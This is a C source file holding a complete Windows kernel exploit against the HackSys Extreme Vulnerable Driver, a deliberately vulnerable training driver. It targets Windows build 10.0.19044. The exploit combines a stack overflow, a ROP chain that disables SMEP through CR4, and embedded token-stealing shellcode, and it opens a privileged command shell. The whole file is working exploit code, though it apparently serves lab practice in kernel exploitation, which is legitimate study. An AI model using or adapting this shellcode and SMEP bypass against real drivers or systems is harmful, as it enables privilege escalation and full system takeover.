#include "Common.h"
#include "Exploits.h"
#include "Gadgets.h"

/*
   HEVD Stack Overflow / Medium Integrity
   
   Author: @xct_de
   Target: 10.0.19044
   
   SMEP Bypass via ROP/CR4 & Token Stealing Bait Shellcode
*/

int HevdStackOverflowMI(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("  Running HevdStackOverflowMI  \n");
	printf("~-----------------------------~\n");

	DWORD OFFSET = 2072;
	ResolveGadgets();

	// ACL Editing Shellcode

	// TokenStealingBail Shellcode
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] NT base: %llx\n", ntBase);

	// allocate shellcode memory & copy shellcode into it
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] SC @ %p\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	int offset = 2072;
	BYTE uBuffer[2104] = { 'A' };

	QWORD *rop = (QWORD*)(uBuffer + offset);
	int index = 0;
	// bypass SMEP via ROP & finish with sc ptr
	printf("%llx\n", ntBase + kernelGadgets["POP_RCX"]);
	getchar();
	*(rop + index++) = ntBase + kernelGadgets["POP_RCX"];
	*(rop + index++) = 0x50ef8; // rcx value with 20th bit zeroed out
	*(rop + index++) = ntBase + kernelGadgets["MOV_CR4_RCX"];
	*(rop + index++) = (QWORD) sc_ptr;

	// trigger
	DWORD IoControlCode = 0x222003;
	BOOL triggerIOCTL = DeviceIoControl(hDriver, IoControlCode, (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);

	printf("[>] Enjoy your shell!\n");

	system("cmd.exe");
    return 0;
}
